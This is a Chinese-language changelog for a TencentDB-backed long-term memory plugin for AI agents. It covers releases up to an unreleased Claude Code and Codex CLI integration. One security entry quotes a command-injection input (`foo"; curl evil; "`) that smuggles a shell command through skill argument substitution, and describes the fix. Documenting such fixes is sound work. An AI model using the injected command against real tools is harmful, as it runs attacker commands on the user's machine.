# Changelog

本文件记录 `@tencentdb-agent-memory/memory-tencentdb` 插件的所有显著变更，格式遵循 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/)，版本号遵循 [Semantic Versioning](https://semver.org/)。

---

## [Unreleased]

### 📦 新功能

- **Claude Code + Codex CLI 插件**（`claude-code-plugin/`）：通过 Claude Code `/plugin install tdai-memory` 或 Codex CLI marketplace 一键启用，不修改用户 `~/.claude/settings.json` 或 `~/.codex/config.toml`。提供 3 个 hooks（`SessionStart` 异步预热、`UserPromptSubmit` 同步召回并通过 `additionalContext` 注入、`Stop` 异步捕获），3 个 slash skills（`/memory-search`、`/memory-status`、`/memory-clear-session`），以及一个总览 skill `tdai-memory`。Daemon 通过 `gateway-entry.ts` wrapper 绑定父进程生命周期。插件携带双 manifest（`.claude-plugin/plugin.json` 与 `.codex-plugin/plugin.json`），共享同一份 `hooks/hooks.json` 与 `skills/` —— cc v2026.4+ 与 Codex CLI v0.117+ 实现了对齐的 hook 协议，因此一套源码同时服务两个宿主。

### 🔧 兼容性 / 安全增强

- **Gateway 可选 Bearer Token 鉴权**：当设置 `TDAI_GATEWAY_TOKEN` 环境变量时，Gateway 要求所有非 OPTIONS 请求带 `Authorization: Bearer <token>`。未设置时行为不变，与 Hermes 完全向后兼容。Claude Code 插件每次 spawn daemon 时生成随机 256-bit token 写入权限 0600 文件。Bearer 字符串比较升级为 `crypto.timingSafeEqual`，Scheme 关键字按 RFC 6750 §2.1 大小写不敏感匹配（`Bearer`/`bearer`/`BEARER` 均可），401 响应携带 `WWW-Authenticate: Bearer realm="tdai-gateway"`。
- **Token 通过文件路径（`TDAI_TOKEN_PATH`）传递给 daemon 子进程**，不再注入到 `TDAI_GATEWAY_TOKEN` 环境变量。后者会随 execve() 写入子进程初始 environment block，使 token 暴露于 `/proc/<pid>/environ` 与 `ps -E`；改为文件传递后只剩 0o600 token 文件这一面，daemon 加载时还会校验文件 owner uid。
- **daemon 主机绑定加固**：cli.ts 启动时拒绝非 loopback 的 `TDAI_GATEWAY_HOST`，除非显式 `TDAI_GATEWAY_ALLOW_REMOTE=1` 打开开关；防止误把记忆端口曝露到 LAN/公网。
- **新增 `tdai-memory-gateway` bin**（`./dist/src/gateway/cli.mjs`）：作为独立可执行 Gateway entry point，支持 `SIGTERM/SIGINT` 优雅关闭、可选父进程 PID liveness 探活（`TDAI_CC_PID` 环境变量，轮询间隔 15s）。供 Claude Code / Codex CLI 插件通过 `npx tdai-memory-gateway` 调用，无需把 npm 依赖打包进插件。
- **daemon 进程管理重写**：基于 `O_CREAT|O_EXCL` 的 `spawn.lock` 互斥，并发触发的 SessionStart / UserPromptSubmit / Stop hook 中只有一个会真正 spawn，其余复用结果，根本性解决双 daemon / 端口与 token 错配问题；`state.json` 改 tmp + rename 原子写；`ensureRunning` 复用旧 daemon 前校验 `state.ccPid` 与当前 cc 一致，避免跨用户/跨会话错用旧 daemon；spawn 时显式设置 `cwd` 与 `TDAI_DATA_DIR` 注入，避免数据目录受 hook 进程 cwd 漂移影响；token 文件权限校验在 Windows 上跳过 `0o077` 位检测（Node `fs` 在 Win 下返回固定 mode 会误报），改用 NTFS ACL。
- **`$ARGUMENTS` 命令注入面收敛**：cc 当前对 SKILL.md ``!`...` `` 块内的 `$ARGUMENTS` 执行字面 `replaceAll`，用户输入 `foo"; curl evil; "` 可注入到 shell（详见 anthropics/claude-code#16163）。重写 `memory-search/SKILL.md` 去掉 ``!`...` `` bash 块，改为引导 Claude 以 heredoc 通过 Bash 工具向 `hook.mjs search-stdin` 的 stdin 喂查询，用户输入不再经过 shell 词法解析。

### 🐛 修复

- **Stop hook 反复重写 L0**：之前每次 Stop 都向 `/capture` 全量发送最近 10 个 turn，而 Gateway 端 `originalUserMessageCount` 位置切片与 `afterTimestamp` 游标都缺失（`CaptureRequest` 不携带这两个字段），导致长会话前 N 个 turn 在每次 Stop 时反复写入 L0，污染 FTS5 与向量索引。改为基于 `$CLAUDE_PLUGIN_DATA/cursors/<sessionId>.json` 持久化的 `lastSentIndex` 取增量，首次发送以 50 turn 封顶，cursor 文件 tmp + rename 原子写。
- **CJK 召回退化**：底层 2-gram 停用词表此前包含 `我们/你们/他们/这个/那个/可以/有没/没有/就是/不是` 等普通双字实义词，"我们的部署方案" 被切成 `[们的, 的部, 部署, 署方, 方案]`、丢失 "我们" 锚点 token，中文查询召回受损。停用词表缩到真正低信息量的疑问/连接片段。
- **transcript 等待逻辑**：Stop hook 等待 cc 落盘从硬 sleep(800ms) 改为 `waitForTranscriptStable(2s)`：每 100ms 轮询 `stat().size`，连续两次相同字节数即视为 flush 完成；慢盘场景更稳。
- **L0 jsonl 直查内存压力**：`searchL0JsonlDirect` 从 `readFile` 整体加载改为 `readline + createReadStream` 流式扫描，避免长会话 jsonl 触发 OOM；文件遍历从字符串排序+reverse（依赖 `YYYY-MM-DD.jsonl` 命名）改为 mtime 倒序，对 cc UUID 命名也工作正常。
- **GatewayClient silent-failure 可观测**：所有 catch 块新增 `logPath` 失败追加，handleStatus 在 `/memory-status` 输出 `hook.log` / `daemon.log` 路径；daemon spawn 的 stdio stderr 重定向到 `daemon.log` 替代静默丢弃。
- **Codex CLI plugin 端 hooks 注册补全**：`.codex-plugin/plugin.json` 之前只声明了 `"skills": "./skills/"`，缺 `"hooks": "./hooks/hooks.json"` —— Codex CLI 与 Claude Code 不同，plugin-local hooks 不走"约定俗成路径"，而是强制从 manifest 的 `hooks` 字段读取（见 `codex-rs/core-plugins/src/manifest.rs::RawPluginManifest`）。补上字段后，已声明的 `SessionStart`/`UserPromptSubmit`/`Stop` 三个 hook 与现有 `${CLAUDE_PLUGIN_ROOT}` env var 在 Codex 侧均原生兼容（Codex `hooks/src/engine/discovery.rs` 注入了 `CLAUDE_PLUGIN_ROOT` backcompat alias，同时配 `PLUGIN_ROOT` 新名）。

### ✅ 测试

- `auth.test.ts`：从 5 个 case 扩展到 14 个，覆盖鉴权对所有 POST 业务端点的矩阵、Bearer scheme 大小写、mangled Authorization 头、`WWW-Authenticate` 响应。
- `hook.test.ts`：新增 cursor 增量、无新 turn 跳过 captureTurn、`MAX_CAPTURE_TURNS=50` 边界 3 个 case，且把 stop describe 整体 stub `CLAUDE_PLUGIN_DATA` 到 mkdtemp 隔离 cursor 状态。
- `daemon.test.ts`：新增 `ensureRunning` 拒绝 ccPid 不匹配旧 state 的回归。

### 📚 文档

- `claude-code-plugin/README.md` 与 `README_CN.md`：安装、配置、数据布局、排障与安全模型完整说明，新增 `TDAI_TOKEN_PATH` / `TDAI_GATEWAY_ALLOW_REMOTE` / `TDAI_GATEWAY_CORS_ORIGIN` / Windows 兼容性说明。
- `claude-code-plugin/README.md` 与 `README_CN.md`：Codex CLI 安装段下新增"已知限制"小节，标注 Codex CLI ≤ v0.130 通过 `source_type = "local"` marketplace 安装时受上游 [openai/codex#22078](https://github.com/openai/codex/issues/22078) 影响，`skills/` 与 `hooks/` 不会暴露到 session；插件这一侧 manifest + hook 协议已就绪，等上游修复或本插件正式发布到 `source_type = "git"` marketplace 后即恢复。

---

## [0.3.4] - 2026-05-12

### 🐛 修复

- **兼容 OpenClaw v2026.4.7 以下版本 L1 抽取空输出**：旧宿主不支持 `systemPromptOverride`，通过 `extraSystemPrompt` 回退注入系统提示，确保 LLM 按数据提取助手身份工作。
- **TCVDB hybrid 召回冗余双重 HTTP 调用**：`auto-recall` 对 TCVDB 发两次相同的 `hybridSearch` 请求（且 keyword 路径将 FTS5 OR 表达式错误传入 BM25 编码器）。新增 `nativeHybridSearch` 短路，TCVDB 单次调用即可完成 dense + sparse + RRF，recall 耗时减半（~50-120ms）。
- **L2 parser 对齐 Go 后端**：增加 mermaid fallback，修复 `first{...last}` JSON 提取逻辑。

### ✨ 改进

- **VDB HTTP 请求级计时**：`tcvdb-client` 每次请求打一条 info 计时日志（`/document/hybridSearch 85ms`），retry/失败细节保持 debug 级别。
- **启动路径误导性日志降级为 DEBUG**：store manifest 不一致、sqlite schema migration、profile-sync MD5 mismatch 等正常场景不再打 warn/info，避免 AI 误判。
- **L1 提取调试日志**：新增 `[l1-debug]` 系列（RESOLVE / INVOKE / RESULT / EMPTY_DUMP / ENTRY / NO_JSON），方便定位 LLM 调用链问题。

### 🔧 兼容性适配

- **OC 2026.4.23 Zod schema 兼容 patch 脚本**（`scripts/bugfix-20260423/`）：一键修复 `allowConversationAccess` 被 `.strict()` 拒绝的问题，含轻量版脚本、全自动脚本、手动 SOP 文档。
- Offload 日志去掉 `Backend` 前缀，默认超时为 120s。

### 📦 新功能

- **Offload Local Mode**：支持本地模式运行 offload（不依赖远端后端）。
- **Docker 一体化镜像**（`Dockerfile.hermes`）：单容器捆绑 Hermes Agent + memory_tencentdb 插件 + TDAI Memory Gateway，统一 `MODEL_*` 环境变量驱动。

### ✅ 测试

- 修复 `fault-injection` FI-05 mock config 缺 `embedding` 字段
- 修复 `cli.test` dependencies 断言适配新增依赖
- 跳过 `patch-effectiveness` 已删除的 `install-plugin.sh` 测试

---

## [0.3.3] - 2026-05-08

### 🐛 修复

- **加固 hook-policy 版本决策逻辑**：仅当宿主版本为严格 `x.y.z` 语义化版本、且 `>= 2026.4.24` 时才自动写入 `hooks.allowConversationAccess`；无法解析（如 `unknown`、beta、snapshot 等非标准版本）时一律跳过，避免对旧版本或非预期版本误写配置导致启动失败。
- hook-policy 关键路径补充 debug 日志（原始版本串、解析后版本、最小要求版本、是否 patch 的决策），方便线上排查。

### ✅ 测试

- 新增 `src/utils/ensure-hook-policy.test.ts`，覆盖标准版本、预发布、`unknown`、边界值等决策 case。

## [0.3.2] - 2026-05-08

### 🐛 修复

- 兼容 OpenClaw v2026.4.23 前的版本，防止写入的 hook 配置导致无法启动
- 修改 allowConversationAccess 到 2026.4.24+ 添加。

## [0.3.1-beta.1] - 2026-05-07

### 🐛 修复

- **兼容 OpenClaw v2026.4.23+ hook 权限策略**：该版本引入 `allowConversationAccess` 安全门控（[openclaw#70786](https://github.com/openclaw/openclaw/pull/70786)），导致非 bundled 插件的 `agent_end` hook 被静默拦截，整个 capture pipeline 失效。新增 `ensurePluginHookPolicy()` 自动检测并补全配置，优先通过 SDK 触发 gateway 自动重启，fallback 手动写入配置文件。
- **兼容 OpenClaw 2026.5.3+ 安装校验**：新增 tsdown 构建配置生成 `dist/index.mjs`，满足新版安装时对编译产物的强制校验（不再允许纯 TypeScript 入口）。
- **声明 `activation.onStartup`**：确保 gateway 在启动时加载本插件。
- **声明 `contracts.tools`**：注册 `tdai_memory_search`、`tdai_conversation_search` 工具名，满足 tool registration contract 要求。

---

## [0.3.0] - 2026-05-06

### 🚀 新功能

**运维管理工具（CTL）**

- 新增 `memory-tencentdb-ctl` 命令行管理工具，支持 standalone 与 hermes 两种运行模式
- 新增 `install-memory-tencentdb` 一键安装脚本
- CTL 新增 `config vdb-off` 命令，支持将 Gateway 存储从 VDB 回退到 SQLite
- Gateway 安装脚本支持将环境变量写入 `~/.hermes/.env`（systemd 场景）

**Offload 增强**

- Offload 启动时自动应用 `after_tool_call` patch，patch 失败时自动禁用 offload
- 新增 `setup-offload.sh` 一键启用/禁用 offload 脚本，支持 `--backend-api-key` 参数
- L0 捕获过滤：排除 offload 注入的 MMD 上下文块，避免将压缩中间产物误存为记忆

**Gateway 自愈与稳定性**

- Hermes 插件新增 watchdog + lazy probe 机制，Gateway 异常时自动恢复
- Gateway YAML 配置解析支持任意深度嵌套

### ✨ 改进

- 数据目录与安装目录统一整合至 `~/.memory-tencentdb/`
- 引入 `$HERMES_HOME` 环境变量约定，移除硬编码 `~/.hermes` 路径
- CTL hermes 配置编辑改为缩进感知，保持原始文件格式
- 运维脚本保留在 tarball 中但不再注册为 bin 命令（减少全局命令污染）
- init/destroy 生命周期日志降级为 debug 级别
- patch 脚本兼容 pnpm 安装环境，使用 Node.js 动态解析 openclaw 安装路径

### 🐛 修复

**Core 稳定性**

- 修复 `ensureSchedulerStarted` 并发调用下的竞态问题
- 修复 `/session/end` 错误销毁全局 scheduler 的问题（改为按 session_key 作用域）
- 修复关闭 store 时未等待后台 fire-and-forget 任务完成的问题
- 修复 `disable_offload` 未正确删除 `slots.contextEngine` 配置的问题

**Offload**

- 修复 slot 占用检测逻辑：仅在 `ok=false`（slot 被占用）时拒绝，API 异常不再误判为冲突
- 修复 `registerContextEngine` 抛异常时未禁用 offload 的问题
- 修复 slot 被占用时未完全禁用所有 offload 功能的问题

**L3 压缩**

- 修复 aggressive/emergency 压缩在用户消息位于队首时卡死的问题
- 修复消息被大量 offload 后压缩停滞的问题

**迁移工具**

- 修复源数据目录或 SQLite 不存在时迁移脚本崩溃的问题（改为优雅跳过）
- 修复源数据为空时 config/manifest 未写入的问题

**脚本与运维**

- 修复 `set -e` 环境下 `((VAR++))` 在 VAR=0 时导致脚本退出的问题
- 修复 patch 脚本误报 FAILED 计数的问题（跳过无 after_tool_call 上下文的候选项）
- 修复 Hermes 退出时未终止 Gateway 子进程的问题

### ♻️ 重构

- 统一 patch 检测逻辑：始终委托给 patch 脚本并通过退出码判定结果

---

## [0.3.0-beta.1] - 2026-04-23

### 🚀 新功能

**短期记忆压缩（Context Offload）**

- 新增 Offload 模块，支持长对话场景下的上下文压缩与记忆卸载

**架构重构：Core + Gateway 多框架支持**

- 重构为 `TdaiCore` 宿主无关的核心层 + 适配器模式，解耦 OpenClaw 框架依赖
- 新增 `HostAdapter` / `LLMRunner` / `LLMRunnerFactory` 抽象接口，支持不同宿主的 LLM 调用
- 新增 Hermes Gateway 适配器（`memory_tencentdb` Hermes Plugin），支持通过 Hermes 框架独立运行
- `TdaiCore` 提供统一的 `handleBeforeRecall()` / `handleTurnCommitted()` / `searchMemories()` 等 API
- Gateway 零配置自动发现：Hermes 插件自动检测配置和数据目录
- 数据目录所有权从插件移至 Gateway 层管理

**Recall 注入优化（Cache 友好）**

- L1 召回记忆从 `appendSystemContext` 移到 `prependContext`（用户消息前缀），避免每轮系统提示词变化导致 prompt cache bust
- Persona / Scene Navigation / Tools Guide 保持在 `appendSystemContext`（稳定内容，连续多轮 cache 命中）
- 注册 `before_message_write` 钩子，在 user message 持久化到 JSONL 前 strip `<relevant-memories>` 标签，防止历史消息中累积旧的召回内容

**分场景 Embedding 超时**

- 新增 `embedding.recallTimeoutMs`（recall 路径）和 `embedding.captureTimeoutMs`（capture 路径）配置
- recall 超时时 hybrid 策略自动降级为纯关键词搜索；capture 超时时 L1 dedup 降级为 FTS
- 向前兼容：不配置时 fallback 到全局 `embedding.timeoutMs`

### ✨ 改进

- CleanContextRunner 通过 `systemPromptOverride` 替换 OpenClaw 默认系统提示词，每次 L1/L2/L3 调用节省 ~4500 input tokens
- L2（场景提取）和 L3（画像生成）prompt 拆分为 `systemPrompt` + `userPrompt`，角色划分更清晰
- Pipeline 默认参数调整：`l1IdleTimeoutSeconds` 60→600s，`l2MinIntervalSeconds` 300→900s，`l2MaxIntervalSeconds` 1800→3600s

### 🐛 修复

- 修复 `pullProfilesToLocal` 并发竞争导致 `ENOTEMPTY` 错误（乐观无锁修法：rename 竞争失败时静默使用对方结果）
- 修复 `originalUserMessageCount` 数据链路断裂导致 L0 recorder 无法定位被污染的 user message
- 修复 `RecallResult` 类型定义缺少 `prependContext` 字段（`types.ts` 与 `auto-recall.ts` 不一致）

---

## [0.2.2] - 2026-04-17

### 🐛 修复

- 修复因未声明 `undici` 依赖导致 TCVDB 客户端加载失败的问题（开发环境之前依赖 monorepo 根 `node_modules` 的传递解析）
- 将插件注册阶段的大量 INFO 日志降级为 DEBUG，避免 CLI 模式下输出过多无关日志

## [0.2.1] - 2026-04-16 (deprecated)

> NOTE: 此版本由于存在 undici 依赖导致插件启动失败的问题，已废弃
> 相关问题在 0.2.2 及以后版本中已修复

### 🚀 新功能

- TCVDB 新增 HTTPS 连接支持，可通过插件配置 `caPemPath` 或迁移脚本参数 `--tcvdb-ca-pem` 指定自定义 CA 证书 PEM 文件
- `read-local-memory` 脚本新增 L2 单文件查询，并将 L0 / L1 查询切换为直接从 `vectors.db` 读取，支持 SQL 层过滤、排序与分页

### ✨ 改进

- TCVDB 的 L0 / L1 向量索引默认调整为 `DISK_FLAT`，并在不支持该索引类型的实例上自动回退到 `HNSW`
- 默认服务端 embedding 模型调整为 `bge-large-zh`
- TCVDB 所有读接口统一启用 `readConsistency: "strongConsistency"`，消除 read-after-write 不一致
- 健康检测脚本 VDB 连接支持 HTTPS 自签证书

### 🐛 修复

- 修复 L3 persona sync 因未拉取远端 baseline 导致版本冲突跳过写入的问题
- 修复 `memories_since_last_persona` 被 L0 和 L1 双重计数导致 persona 触发阈值膨胀的问题
- 移除 `CheckpointManager` 中已被 `captureAtomically()` 替代的废弃方法

---

## [0.2.0] - 2026-04-15

### 🚀 新功能

**腾讯云向量数据库（TCVDB）存储后端**

- 新增腾讯云向量数据库存储后端，支持向量 + BM25 混合召回
- 支持 SQLite 与 TCVDB 之间的索引结构同步
- L2 场景 / L3 画像支持在本地缓存与向量数据库之间双向同步
- 插件配置（manifest）暴露 `storeBackend`、`tcvdb`、`bm25`、`embedding.timeoutMs` 等配置项

**本地 BM25 关键字检索**

- 使用本地 tcvdb-text 编码器替代原有的 BM25 HTTP sidecar 服务，消除外部依赖

**Seed 数据导入工具**

- 新增 CLI `seed` 命令，支持从外部数据批量导入记忆
- 提取共享的 pipeline-factory，供 seed 和正常运行时复用
- 支持 ISO 8601 时间戳格式（移除 JSONL 支持）

**数据迁移与运维工具**

- 新增 SQLite → 腾讯云向量数据库迁移脚本，支持 `--help` / `-h` 展示完整参数说明和使用示例
- 新增 VDB 数据导出脚本（含预编译 JS 和 CLI 启动器）
- 新增本地 Memory 数据查询脚本
- 注册全部 CLI bin 入口：`migrate-sqlite-to-tcvdb`、`export-tencent-vdb`、`read-local-memory`

**记忆搜索工具调用限制**

- `tdai_memory_search` + `tdai_conversation_search` 增加每轮合计最多 3 次的调用次数限制，通过 tool description 和召回引导提示词约束模型行为，防止陷入无效重复搜索

### 🐛 修复

- 修复 L2 场景合并（MERGE）无法删除旧文件的问题：OpenClaw 4.1+ 的 write 工具拒绝空白内容，改用 `[DELETED]` 标记实现软删除，SceneExtractor cleanup 阶段同步识别并清理
- 修复 L2 抽取产生孤立 BATCH/ARCHIVE 文件的问题，统一 maxScenes 上限为 15
- 修复 L3 启动时重复拉取 profile 的问题
- 过滤 skill wrapper 噪声标记（`¥¥[...]¥¥`）
- 处理 `createCollection` 并发竞态（错误码 15202）

### ♻️ 重构

- Pipeline checkpoint 游标语义从 timestamp 改为 update_at
- Runner 改用 `api.runtime.agent.runEmbeddedPiAgent`，避免跨环境导入失败
- 统一脚本构建流程：新增 `build:scripts` 一键编译命令，`prepack` 钩子确保 `npm pack` 前自动编译全部脚本产物

### 📚 文档

- 新增 AI Agent 长期记忆插件设计与实现技术文档
- 新增项目指南、研发系统分层架构文档
- 新增 VDB 存储设计文档及迁移指南

---

<details>
<summary>预发布版本</summary>

## [0.2.0-beta.1] - 2026-04-14

*此版本的内容已合并至 [0.2.0] 正式版。*

</details>

## [0.1.4] - 2026-04-10

### 🚀 Features

- *(auto-recall)* Add recall hint text before memories

## [0.1.3] - 2026-04-09

### 🚀 功能

- *(memory-tdai)* 用 reporter 抽象替换 emitMetric
- *(L3)* L3 使用读写工具，防止模型输出 CoT
- *(memory)* 添加 embedding 截断、召回超时，以及从 L0 捕获中剔除代码块
- *(config)* Embedding 超时支持配置
- *(report)* 在 schema 中暴露 report 配置项，默认值改为 false

### 🐛 修复

- *(capture)* 跳过心跳/定时任务/自动化/调度类消息
- *(recall)* 召回完成时清除超时定时器，避免误报超时警告

### 💼 Other

- 重命名包名为 memory-tencentdb
- *(deps)* 将 node-llama-cpp 改为可选依赖

### ⚡ 性能

- *(auto-capture)* 将 L0 向量嵌入移至后台以降低延迟

### 📚 文档

- 添加 allowPromptInjection 配置警告说明

## [0.1.2] — 2026-03-26

### 更新内容

1. 优化对话捕获与记忆抽取过滤机制

## [0.1.1] — 2026-03-25

### 更新内容

1. 兼容 openclaw 2026.3.23 更新

## [0.1.0] — 2026-03-25

> 首个正式发布版本。本地优先的四层记忆系统（L0→L1→L2→L3），基于 SQLite + LLM 实现对话捕获、记忆提取、场景归纳与用户画像。

### 更新内容

1. 关键字检索增加 FTS5 全文索引，采用 jieba 分词
2. 未配置远程 embedding 服务时，默认不开启 embedding 能力（不自动使用本地 embedding，且封禁主动使用本地 embedding 的配置入口）
3. 优化 L2、L3 生成 prompt 以控制生成内容大小（减少 token 开销）
4. Pipeline 调度器优化文件锁用法
5. 避免全量读取 L0、L1 数据
